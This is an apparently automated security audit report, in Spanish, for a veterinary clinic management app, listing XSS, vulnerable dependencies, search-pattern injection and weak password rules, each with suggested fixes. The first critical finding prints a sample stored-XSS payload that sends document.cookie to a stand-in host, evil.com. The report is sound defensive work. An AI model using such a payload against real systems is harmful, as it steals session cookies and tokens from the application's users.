# 🔐 DAVLI Security Audit Report — Kachorros

**Fecha:** 2026-06-18  
**Proyecto:** Kachorros — Gestión de Clínica Veterinaria  
**Stack:** React 19 + Vite 7 + TypeScript + Supabase + Tailwind  
**Alcance:** Código fuente (`src/`), dependencias, secretos, configuración

---

## 📊 Executive Summary

| Métrica | Valor |
|---|---|
| **Risk Score** | **62 / 100** (High Risk) |
| Vulnerabilidades encontradas | 22 |
| Critical | 2 |
| High | 8 |
| Medium | 7 |
| Low | 5 |
| Dependencias vulnerables | 14 (0 Critical, 9 High, 4 Moderate, 1 Low) |
| Secretos expuestos | 0 (limpio) |

**Veredicto:** El proyecto tiene **2 vulnerabilidades críticas de XSS** en generadores de PDF/impresión que permiten inyección de HTML/JavaScript arbitrario desde contenido de tratamientos médicos. Las dependencias principales (react-router-dom, vite) tienen CVEs **HIGH** activos que requieren actualización urgente. La arquitectura multi-tenant con Supabase es sólida. No se encontraron secretos expuestos.

---

## 🔴 Critical Findings (2)

### CRIT-001 — Stored XSS via innerHTML en Generación de PDF

| Campo | Detalle |
|---|---|
| **Archivo** | `src/lib/pdfTratamiento.ts:122` |
| **Vulnerabilidad** | Cross-Site Scripting (XSS) — Stored |
| **Severidad** | Critical (CVSS 7.1) |
| **Origen** | Code Audit |

**Descripción:** La función `generarPdfTratamiento()` construye HTML dinámico con `container.innerHTML = buildHtml(tratamiento, logoUrl)`. La variable `tratamiento` proviene del campo `tratamiento` de la tabla `consultas` (ingresado por usuarios doctora/admin). Este valor se interpola **sin sanitización** directamente en la línea 83: `<div class="content">${tratamiento \|\| 'Sin tratamiento registrado.'}</div>`.

Un atacante con acceso de escritura (rol doctora/admin) podría inyectar payloads como:
```html
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```

El XSS se ejecuta al generar el PDF (contexto del navegador), con acceso a localStorage, cookies de sesión, y tokens de Supabase.

**Evidencia:**
```typescript
// pdfTratamiento.ts:122
container.innerHTML = buildHtml(tratamiento, logoUrl)

// pdfTratamiento.ts:83 — interpolación sin escape
<div class="content">${tratamiento || 'Sin tratamiento registrado.'}</div>
```

**Fix:** Sanitizar el HTML con DOMPurify antes de interpolar:
```typescript
import DOMPurify from 'dompurify'

function buildHtml(tratamiento: string, logoUrl?: string): string {
  const safeTratamiento = DOMPurify.sanitize(tratamiento, { ALLOWED_TAGS: [] })
  // ... resto del template
}
```

O alternativamente, usar `textContent` en vez de `innerHTML` para el contenido de tratamiento:
```typescript
const contentEl = container.querySelector('.content')
if (contentEl) contentEl.textContent = tratamiento
```

---

### CRIT-002 — Stored XSS via innerHTML en Impresión de Tratamiento

| Campo | Detalle |
|---|---|
| **Archivo** | `src/lib/printTratamiento.ts:8` |
| **Vulnerabilidad** | Cross-Site Scripting (XSS) — Stored |
| **Severidad** | Critical (CVSS 7.1) |
| **Origen** | Code Audit |

**Descripción:** Mismo vector que CRIT-001 pero en la función `imprimirTratamiento()`. El contenido del tratamiento se interpola en `container.innerHTML` sin sanitización en la línea 33.

**Evidencia:**
```typescript
// printTratamiento.ts:8 y :33
container.innerHTML = `
...
<div class="content">${tratamiento || 'Sin tratamiento registrado.'}</div>
`
```

**Fix:** Idéntico a CRIT-001 — sanitizar con DOMPurify o usar `textContent`.

---

## 🟠 High Findings (8)

### HIGH-001 — React Router: RCE por Deserialización Insegura

| Campo | Detalle |
|---|---|
| **Archivo** | `package.json:59` → `react-router-dom: ^7.14.0` |
| **Vulnerabilidad** | Remote Code Execution (CWE-502) |
| **CVSS** | 8.1 |
| **CVE** | GHSA-49rj-9fvp-4h2h |
| **Origen** | Dependency Audit |

**Descripción:** react-router-dom 7.0.0–7.14.1 incluye turbo-stream v2 que permite invocación arbitraria de constructores vía TYPE_ERROR durante deserialización, resultando en RCE sin autenticación.

**Fix:** Actualizar a `react-router-dom >= 7.15.0`:
```bash
npm install react-router-dom@^7.15.0
```

---

### HIGH-002 — React Router: DoS por Path Expansion Ilimitada

| Campo | Detalle |
|---|---|
| **Archivo** | `package.json:59` → `react-router-dom: ^7.14.0` |
| **Vulnerabilidad** | Denial of Service (CWE-400) |
| **CVSS** | 7.5 |
| **CVE** | GHSA-8x6r-g9mw-2r78 |
| **Origen** | Dependency Audit |

**Descripción:** El endpoint `__manifest` permite expansión de rutas sin límites que puede causar DoS.

**Fix:** Se resuelve con la misma actualización a `react-router-dom >= 7.15.0`.

---

### HIGH-003 — Vite: Path Traversal + File Read en Dev Server

| Campo | Detalle |
|---|---|
| **Archivo** | `package.json:85` → `vite: ^7.2.4` |
| **Vulnerabilidad** | Path Traversal / Arbitrary File Read (CWE-22) |
| **CVSS** | High |
| **CVEs** | GHSA-v2wj-q39q-566r, GHSA-p9ff-h696-f583, GHSA-fx2h-pf6j-xcff |
| **Origen** | Dependency Audit |

**Descripción:** Vite 7.0.0–7.3.4 tiene múltiples vulnerabilidades: bypass de `server.fs.deny` con queries, lectura arbitraria de archivos vía WebSocket del dev server, y bypass en paths alternativos de Windows.

**Fix:** Actualizar a `vite >= 7.3.5`:
```bash
npm install vite@^7.3.5
```

---

### HIGH-004 — Missing Rate Limiting en Login

| Campo | Detalle |
|---|---|
| **Archivo** | `src/controllers/auth.controller.ts:83-99` |
| **Vulnerabilidad** | Brute Force / Credential Stuffing |
| **Severidad** | High |
| **Origen** | Code Audit |

**Descripción:** La función `login()` no tiene ningún mecanismo de rate limiting. Un atacante puede hacer intentos ilimitados de login. Si bien Supabase tiene rate limiting del lado del servidor, una capa adicional en el frontend es defensa en profundidad.

**Fix:** Implementar retry con backoff exponencial o delegar el rate limiting a Supabase Auth (ya lo tiene configurable). Como mínimo, agregar un delay progresivo en el cliente:
```typescript
// En auth.controller.ts
private loginAttempts = new Map<string, { count: number; lastAttempt: number }>()

async login(email: string, password: string) {
  const attempts = this.loginAttempts.get(email) || { count: 0, lastAttempt: 0 }
  const now = Date.now()
  
  if (attempts.count >= 5 && now - attempts.lastAttempt < 300000) {
    const waitMin = Math.ceil((300000 - (now - attempts.lastAttempt)) / 60000)
    return { user: null, error: `Demasiados intentos. Espera ${waitMin} minutos.` }
  }
  
  // ... existing login logic
}
```

---

### HIGH-005 — ILIKE Injection en Búsqueda de Catálogo

| Campo | Detalle |
|---|---|
| **Archivo** | `src/controllers/catalogo.controller.ts:83` |
| **Vulnerabilidad** | SQL/ILIKE Pattern Injection |
| **Severidad** | High (reducido por uso de SDK) |
| **Origen** | Code Audit |

**Descripción:** La función `buscar()` interpola directamente el input del usuario en patrones ILIKE de Supabase:
```typescript
.or(`nombre.ilike.%${q}%,codigo.ilike.%${q}%,descripcion.ilike.%${q}%`)
```

Si bien el SDK de Supabase sanitiza contra SQL injection clásico, caracteres especiales de ILIKE/postgreSQL como `%`, `_`, y `\` pueden ser abusados para modificar el comportamiento de la búsqueda, causar queries ineficientes (DoS), o en casos extremos combinarse con otras vulnerabilidades.

**Fix:** Escapar caracteres especiales de ILIKE antes de interpolar:
```typescript
function escapeILike(value: string): string {
  return value.replace(/[%_\\]/g, '\\$&')
}

// Usar:
const safeQ = escapeILike(q)
.or(`nombre.ilike.%${safeQ}%,codigo.ilike.%${safeQ}%,descripcion.ilike.%${safeQ}%`)
```

---

### HIGH-006 — ILIKE Injection en Búsqueda de Mascotas

| Campo | Detalle |
|---|---|
| **Archivo** | `src/controllers/mascota.controller.ts:173,183` |
| **Vulnerabilidad** | ILIKE Pattern Injection |
| **Severidad** | High |
| **Origen** | Code Audit |

**Descripción:** El mismo vector que HIGH-005 pero en la búsqueda de mascotas:
```typescript
.or(`nombre.ilike.%${q}%,raza.ilike.%${q}%`)      // línea 173
.or(`nombre.ilike.%${q}%,telefono.ilike.%${q}%`)   // línea 183
```

**Fix:** Misma función `escapeILike()` recomendada en HIGH-005.

---

### HIGH-007 — PostCSS XSS via CSS Stringify

| Campo | Detalle |
|---|---|
| **Archivo** | `package.json:79` → `postcss: ^8.5.6` |
| **Vulnerabilidad** | XSS via unescaped `</style>` in CSS output (CWE-79) |
| **CVSS** | 6.1 |
| **CVE** | GHSA-qx2v-qp2m-jg93 |
| **Origen** | Dependency Audit |

**Descripción:** PostCSS < 8.5.10 no escapa correctamente `</style>` en su salida de stringify, permitiendo XSS si el CSS procesado contiene datos de usuario.

**Fix:** Actualizar postcss:
```bash
npm install postcss@^8.5.10
```

---

### HIGH-008 — lodash Prototype Pollution + Code Injection

| Campo | Detalle |
|---|---|
| **Archivo** | Transitive dependency via various packages |
| **Vulnerabilidad** | Prototype Pollution (CWE-1321) + Code Injection (CWE-94) |
| **CVSS** | 8.1 (_.template) / 6.5 (_.unset, _.omit) |
| **CVEs** | GHSA-r5fr-rjxr-66jc, GHSA-f23m-r3pf-42rh |
| **Origen** | Dependency Audit |

**Descripción:** lodash <= 4.17.23 es vulnerable a code injection via `_.template` y prototype pollution via `_.unset`/`_.omit`. Aunque no se usa directamente en el código, es una dependencia transitiva.

**Fix:** `npm audit fix` resuelve la mayoría. Forzar resolución si es necesario:
```json
// package.json
"overrides": {
  "lodash": "^4.17.24"
}
```

---

## 🟡 Medium Findings (7)

### MED-001 — Política de Contraseñas Débil

| Campo | Detalle |
|---|---|
| **Archivos** | `src/app/establecer-contrasena/page.tsx:78`, `src/app/perfil/page.tsx:26` |
| **Vulnerabilidad** | Weak Password Policy |
| **Severidad** | Medium |
| **Origen** | Code Audit |

**Descripción:** La validación de contraseña solo exige 6 caracteres mínimos. No hay requisitos de:
- Mínimo de caracteres especiales
- Combinación mayúsculas/minúsculas/números
- Verificación contra listas de contraseñas comunes
- Longitud recomendada (NIST recomienda 8+)

**Fix:** Implementar política robusta:
```typescript
function validatePassword(password: string): { ok: boolean; reason?: string } {
  if (password.length < 8) return { ok: false, reason: 'Mínimo 8 caracteres' }
  if (!/[A-Z]/.test(password)) return { ok: false, reason: 'Debe incluir mayúsculas' }
  if (!/[a-z]/.test(password)) return { ok: false, reason: 'Debe incluir minúsculas' }
  if (!/[0-9]/.test(password)) return { ok: false, reason: 'Debe incluir números' }
  if (!/[^A-Za-z0-9]/.test(password)) return { ok: false, reason: 'Debe incluir caracteres especiales' }
  return { ok: true }
}
```

---

### MED-002 — Información en Mensajes de Error

| Campo | Detalle |
|---|---|
| **Archivo** | `src/controllers/auth.controller.ts:90` |
| **Vulnerabilidad** | Information Disclosure |
| **Severidad** | Medium |
| **Origen** | Code Audit |

**Descripción:** El mensaje `'Credenciales incorrectas.'` es genérico (correcto), pero otros mensajes exponen detalles internos:
- Línea 95: `'Tu usuario no tiene perfil configurado o la cuenta está suspendida.'` — revela que el email existe
- Línea 131: `'Registro creado, pero faltó perfil: ${perfilError.message}'` — expone error interno de BD

**Fix:** Usar mensajes genéricos para el usuario y loggear detalles en consola (solo desarrollo):
```typescript
// login: no distinguir entre "no existe" y "suspendido"
return { user: null, error: 'Credenciales incorrectas.' }

// registrar: mensaje genérico
return { ok: false, error: 'No se pudo completar el registro. Intenta de nuevo.' }
```

---

### MED-003 — SMTP Password Almacenado en Base de Datos

| Campo | Detalle |
|---|---|
| **Archivo** | `src/controllers/email.controller.ts:68` |
| **Vulnerabilidad** | Sensitive Data Storage |
| **Severidad** | Medium |
| **Origen** | Code Audit |

**Descripción:** Las contraseñas de aplicación SMTP (Gmail App Passwords) se almacenan en texto plano en la tabla `config_email` de Supabase. Si un atacante obtiene acceso a la base de datos, obtiene acceso completo al correo de la clínica.

**Fix:** Idealmente, almacenar la contraseña como secreto en Supabase Vault o Edge Function Secrets. Como mínimo, encriptar antes de guardar con una clave derivada de la veterinaria:
```typescript
// Guardar en Edge Function secrets, no en base de datos.
// Si DEBE estar en BD, al menos hashear o usar pgcrypto.
```

---

### MED-004 — CSRF Protection Ausente en API Calls

| Campo | Detalle |
|---|---|
| **Archivos** | Todos los controllers que llaman a Supabase |
| **Vulnerabilidad** | Cross-Site Request Forgery (CSRF) |
| **Severidad** | Medium |
| **Origen** | Code Audit |

**Descripción:** Si bien Supabase Auth usa tokens JWT en headers (lo que mitiga parcialmente CSRF), no hay tokens CSRF explícitos ni headers `SameSite` configurados. El proyecto no configura políticas de seguridad a nivel de aplicación.

**Fix:** Configurar cookies de Supabase con `SameSite=Strict` y agregar header `X-Requested-With` en peticiones sensibles. Verificar configuración de Supabase Auth.

---

### MED-005 — Missing Content-Security-Policy (CSP)

| Campo | Detalle |
|---|---|
| **Archivo** | `vercel.json` (deployment config) |
| **Vulnerabilidad** | Missing Security Headers |
| **Severidad** | Medium |
| **Origen** | Code Audit |

**Descripción:** No hay configuración de Content-Security-Policy. Sin CSP, las vulnerabilidades XSS (como CRIT-001 y CRIT-002) son mucho más peligrosas porque el navegador no restringe la ejecución de scripts inline ni conexiones a orígenes externos.

**Fix:** Agregar headers de seguridad en `vercel.json`:
```json
{
  "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }],
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://*.supabase.co; font-src 'self'" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" }
      ]
    }
  ]
}
```

---

### MED-006 — Lack of Input Sanitization in User-Facing Text

| Campo | Detalle |
|---|---|
| **Archivos** | Todos los controllers que aceptan texto libre (nombre, dirección, notas, etc.) |
| **Vulnerabilidad** | Stored XSS via unsanitized text rendering |
| **Severidad** | Medium |
| **Origen** | Code Audit |

**Descripción:** Los campos de texto libre (nombre de mascota, dirección, notas, diagnóstico, etc.) se guardan sin sanitización y se renderizan en el frontend. Si React no escapa adecuadamente en algún punto (o si se usa `dangerouslySetInnerHTML` en el futuro), hay riesgo de stored XSS.

**Fix:** Sanitizar inputs en el servidor (Supabase) o en los controllers antes de insertar. React por defecto escapa JSX, así que el riesgo es bajo mientras no se use `dangerouslySetInnerHTML`.

---

### MED-007 — `dangerouslySetInnerHTML` en Chart Component

| Campo | Detalle |
|---|---|
| **Archivo** | `src/components/atoms/ui/chart.tsx:83` |
| **Vulnerabilidad** | Potencial XSS |
| **Severidad** | Medium (bajo riesgo actual, requiere auditoría futura) |
| **Origen** | Code Audit |

**Descripción:** El componente de chart usa `dangerouslySetInnerHTML` para inyectar CSS variables. Actualmente el contenido proviene de constantes del tema (no de usuario), pero es un patrón peligroso que podría extenderse.

**Fix:** Documentar que este uso es excepcional y solo para constantes de tema. Agregar comentario:
```typescript
// SAFETY: THEMES is a compile-time constant, not user input
dangerouslySetInnerHTML={{ __html: ... }}
```

---

## 🟢 Low Findings (5)

### LOW-001 — Uso de `any` en Mapeo de Filas

| **Archivos** | `src/controllers/mascota.controller.ts:27`, `veterinaria.controller.ts:12`, `auth.controller.ts:22` |
|---|---|
| **Descripción** | Varios controllers usan `(row: any)` en funciones de mapeo, perdiendo type safety. |
| **Fix** | Usar tipos específicos como `ConsultaRow`, `CatalogoRow` (ya definidos en algunos controllers). |

### LOW-002 — Missing HSTS Header

| **Descripción** | No se configura HTTP Strict-Transport-Security. |
| **Fix** | Agregar `Strict-Transport-Security: max-age=31536000; includeSubDomains` en headers de deploy. |

### LOW-003 — Flatted Unbounded Recursion DoS

| **Dependencia** | `flatted` <= 3.4.1 (transitiva) — GHSA-25h7-pfq9-p65f |
| **Fix** | `npm audit fix` |

### LOW-004 — @babel/core Arbitrary File Read

| **Dependencia** | `@babel/core` <= 7.29.0 (transitiva, dev) — GHSA-4x5r-pxfx-6jf8 |
| **Fix** | `npm audit fix` |

### LOW-005 — minimatch ReDoS por Extglob Anidados

| **Dependencia** | `minimatch` < 3.1.4 / 9.0.0–9.0.6 (transitiva) — GHSA-23c5-xmqv-rm74 |
| **Fix** | `npm audit fix` |

---

## 📦 Dependency Vulnerability Summary

| Package | Severity | CVEs | Fixed In | Reachable |
|---|---|---|---|---|
| react-router-dom | 🔴 HIGH | RCE (8.1), DoS (7.5), CSRF, Open Redirect | >= 7.15.1 | Yes |
| vite | 🔴 HIGH | Path Traversal, File Read, fs bypass | >= 7.3.5 | Dev only |
| postcss | 🟡 MODERATE | XSS via CSS (6.1) | >= 8.5.10 | Build time |
| lodash | 🔴 HIGH | Code Injection (8.1), Prototype Pollution | ^4.17.24 | Transitive |
| flatted | 🔴 HIGH | DoS (7.5), Prototype Pollution | ^3.4.2 | Transitive |
| minimatch | 🔴 HIGH | ReDoS (7.5) | ^3.1.4 / ^9.0.7 | Transitive |
| picomatch | 🔴 HIGH | ReDoS (7.5), Method Injection | ^2.3.2 / ^4.0.4 | Transitive |
| @babel/plugin-transform-modules-systemjs | 🔴 HIGH | Code Gen (8.2) | Latest | Transitive (dev) |
| rollup | 🔴 HIGH | Path Traversal | ^4.59.0 | Transitive (dev) |
| ajv | 🟡 MODERATE | ReDoS | ^6.14.0 | Transitive (dev) |
| brace-expansion | 🟡 MODERATE | DoS (6.5) | ^1.1.13 / ^2.0.3 | Transitive (dev) |
| js-yaml | 🟡 MODERATE | DoS (5.3) | > 4.1.1 | Transitive (dev) |
| @babel/core | 🟢 LOW | File Read (3.2) | Latest | Transitive (dev) |

**Recomendación inmediata:**
```bash
npm install react-router-dom@latest vite@latest postcss@latest
npm audit fix
```

---

## 🔑 Secrets Audit — Clean ✅

| Check | Resultado |
|---|---|
| `.env` en git history | ❌ No encontrado (`.gitignore` efectivo) |
| API Keys en código fuente | ❌ Ninguna |
| Hardcoded passwords | ❌ Ninguna |
| JWT secrets expuestos | ❌ Ninguno |
| SMTP passwords en código | ✅ Solo en BD (ver MED-003) |
| `.env.example` limpio | ✅ Solo placeholders |
| Supabase anon key | ✅ En `.env` (gitignored), expuesta en frontend por diseño (es anon key) |

---

## 🛡️ Remediation Checklist

### Inmediato (esta semana)
- [ ] **CRIT-001/002**: Sanitizar `tratamiento` con DOMPurify en `pdfTratamiento.ts` y `printTratamiento.ts`
- [ ] **HIGH-001/002**: Actualizar `react-router-dom` a >= 7.15.1
- [ ] **HIGH-003**: Actualizar `vite` a >= 7.3.5
- [ ] **HIGH-005/006**: Escapar caracteres especiales en búsquedas ILIKE
- [ ] **MED-005**: Configurar CSP y security headers en `vercel.json`

### Corto Plazo (2 semanas)
- [ ] **HIGH-004**: Implementar rate limiting en login
- [ ] **MED-001**: Endurecer política de contraseñas (8+ chars, complejidad)
- [ ] **MED-002**: Revisar y homogeneizar mensajes de error (no leak info)
- [ ] **MED-006**: Sanitizar inputs de texto libre en controllers
- [ ] Ejecutar `npm audit fix` para dependencias transitivas

### Mediano Plazo (1 mes)
- [ ] **MED-003**: Migrar SMTP credentials a Supabase Vault/Edge Secrets
- [ ] **MED-004**: Configurar SameSite=Strict en cookies de Supabase Auth
- [ ] **MED-007**: Documentar uso seguro de `dangerouslySetInnerHTML`
- [ ] **LOW-001**: Reemplazar tipos `any` por tipos específicos en controllers
- [ ] **LOW-002**: Agregar header HSTS

---

## 🏗️ Recomendaciones Arquitectónicas (SDD)

1. **Input Sanitization Layer:** Crear un módulo `src/lib/sanitize.ts` con funciones de sanitización reusables (HTML, ILIKE, SQL) que todos los controllers usen.

2. **Security Headers Middleware:** Si se migra a un edge server (Vercel Edge Functions, Cloudflare Workers), agregar middleware de security headers.

3. **Password Policy Service:** Extraer validación de contraseñas a un módulo compartido entre páginas.

4. **Audit Logging:** Agregar logs de eventos de seguridad (login fallido, cambios de contraseña, eliminación de usuarios) en una tabla `audit_log`.

5. **Supabase RLS:** Verificar que las Row Level Security policies están correctamente configuradas para todas las tablas (actualmente se filtra por `veterinaria_id` en código, pero RLS es defensa adicional).

---

*Reporte generado por DAVLI Security Audit Pipeline (danger-audit-code + danger-audit-deps + danger-audit-secrets)*
